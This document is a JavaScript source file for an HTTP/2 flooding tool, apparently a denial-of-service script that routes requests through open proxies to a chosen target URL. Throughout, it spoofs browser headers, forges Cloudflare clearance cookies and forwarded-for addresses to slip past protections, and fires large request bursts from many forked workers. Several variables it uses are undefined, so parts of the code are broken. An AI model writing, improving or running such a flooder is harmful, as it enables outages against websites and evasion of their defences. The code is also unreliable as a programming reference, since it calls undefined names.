process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHILD", () => {
    return 1;
});

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const gradient = require('gradient-string');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
var path = require("path");
var fileName = __filename;
var colors = require("colors");
var file = path.basename(fileName);

if (process.argv.length < 7) {
    console.log('node httpv3.js <url> <time> <requests> <threads> <proxy>'.rainbow);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLSv1_2_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

    const args = {
        target: process.argv[2],
        time: process.argv[3],
        rate: process.argv[4],
        threads: process.argv[5],
        proxy: process.argv[6],
        cookie: process.argv[7] || undefined
    }

    const accept_header = [
            '*/*',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
            'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
            'text/html, application/xhtml+xml, image/jxr, */*',
            'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
            'application/javascript, */*;q=0.8',
            'text/html, text/plain; q=0.6, */*; q=0.1',
            'application/graphql, application/json; q=0.8, application/xml; q=0.7',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        ],
        cache_header = [
            'no-cache',
            'no-store',
            'no-transform',
            'only-if-cached',
            'max-age=0',
            'must-revalidate',
            'public',
            'private',
            'proxy-revalidate'
        ],
        lang_header = [
            'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
            'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
            'en-US,en;q=0.5',
            'en-US,en;q=0.9',
            'de-CH;q=0.7',
            'da, en-gb;q=0.8, en;q=0.7',
            'cs;q=0.5',
             'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8',
          ],
        platform = [
            "Windows",
            "Macintosh",
            "Linux",
            "iOS",
            "Android",
            "PlayStation 4",
            "iPhone",
            "iPad",
            "Other"
        ],
        dest_header = [
            'audio',
            'audioworklet',
            'document',
            'embed',
            'empty',
            'font',
            'frame',
            'iframe',
            'image',
            'manifest',
            'object',
            'paintworklet',
            'report',
            'script',
            'serviceworker',
            'sharedworker',
            'style',
            'track',
            'video',
            'worker',
            'xslt',
            ''
        ],
        mode_header = [
            'cors',
            'navigate',
            'no-cors',
            'same-origin',
            'websocket'
        ],
        site_header = [
            'cross-site',
            'same-origin',
            'same-site',
            'none'
        ],
        encoding_header = [
            'deflate, gzip;q=1.0, *;q=0.5',
            'gzip, deflate, br',
            'gzip, deflate',
            '*',
        ]
    var proxies = readLines(args.proxy);
    const parsedTarget = url.parse(args.target);

    if (cluster.isMaster) {
        const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++) {
        	console.clear()
        console.log("ATTACK SENT | HTTPV3 OLD METHODS".bgRed);
        console.log("@Bettercallcrisxtop".blue);
            cluster.fork();
            }
    } else {
        setInterval(runFlooder)
    }

    class NetSocket {
        constructor() {}

        HTTP(options, callback) {
            const parsedAddr = options.address.split(":");
            const addrHost = parsedAddr[0];
            const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
            const buffer = new Buffer.from(payload);
            const connection = net.connect({
                host: options.host,
                port: options.port,
                allowHalfOpen: true,
                writable: true,
                readable: true
            });

            connection.setTimeout(options.timeout * 10000);
            connection.setKeepAlive(true, 10000);
            connection.setNoDelay(true);
            connection.on("connect", () => {
                connection.write(buffer);
            });

            connection.on("data", chunk => {
                const response = chunk.toString("utf-8");
                const isAlive = response.includes("HTTP/1.1 200");
                if (isAlive === false) {
                    connection.destroy();
                    return callback(undefined, "403");
                }
                return callback(connection, undefined);
            });

            connection.on("timeout", () => {
                connection.destroy();
                return callback(undefined, "403");
            });

            connection.on("error", error => {
                connection.destroy();
                return callback(undefined, "403");
            });
        }
    }
    const uas = uap[Math.floor(Math.floor(Math.random() * uap.length))];
    function getRandomUserAgent() {
    const osList = ['Windows', 'Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Windows', 'Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
      if (i % randomOrder === 0) {
        finalString += encryptedString.charAt(i);
      } else {
        finalString += encryptedString.charAt(i).toUpperCase();
      }
    }
    return finalString;
  }
    const Socker = new NetSocket();
    headers[":method"] = "GET";
    headers[":path"] = parsedTarget.path;
    headers[":scheme"] = "https";
    headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
    headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
    headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
    headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
    headers["pragma"] = "no-cache";
    headers["cf-mitigated"] = "challenge";
    headers["referer"] = "https://www.google.com/";
    headers["origin-agent-cluster"] = "?1";
    headers["origin"] = parsedTarget.host;
    headers["cookie"]= "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
    headers["cdn-loop"] = "cloudflare";
    headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
    headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
    headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
    headers["sec-fetch-user"] = "?1";
    headers["upgrade-insecure-requests"] = "1";
    headers["user-agent"] = getRandomUserAgent();
    headers["x-requested-with"] = "XMLHttpRequest";

    function runFlooder() {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");
        headers[":authority"] = parsedTarget.host
        headers["x-forwarded-for"] = parsedProxy[0];
        headers["x-forwarded-proto"] = "https";
        const proxyOptions = {
            host: parsedProxy[0],
            port: parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 100
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) return
            connection.setKeepAlive(true, 60000);
            connection.setNoDelay(true);

            const settings = {
                enablePush: false,
                initialWindowSize: 1073741823
            };

            const tlsOptions = {
                port: 443,
                ALPNProtocols: [
                    "h2", "spdy/3.1" , "http/1.1"
                ],
                secure: true,
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
                socket: connection,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: false,
                rejectUnauthorized: false,
                servername: url.hostname,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                secureOptions: secureOptions,
                secureContext: secureContext,
                secureProtocol: secureProtocol
            };

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60 * 1000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 100,
                    initialWindowSize: 6291456 * 10,
                    maxHeaderListSize: 262144 * 10,
                    enablePush: false
                  },
                     maxSessionMemory: 64000,
                     maxDeflateDynamicTableSize: 4294967295,
                     createConnection: () => tlsConn,
                     socket: connection,
                 });
         
                 client.settings({
                    headerTableSize: 65536,
                    maxConcurrentStreams: 100,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                  });

            client.setMaxListeners(0);
            client.settings(settings);

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const request = client.request(headers)

                            .on("response", response => {
                                request.close();
                                request.destroy();
                                return
                            });

                        request.end();
                    }
                }, 1000);
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
                return
            });

            client.on("error", error => {
                client.destroy();
                connection.destroy();
                return
            });
        });
    }

    const KillScript = () => process.exit();
    setTimeout(KillScript, args.time * 1000);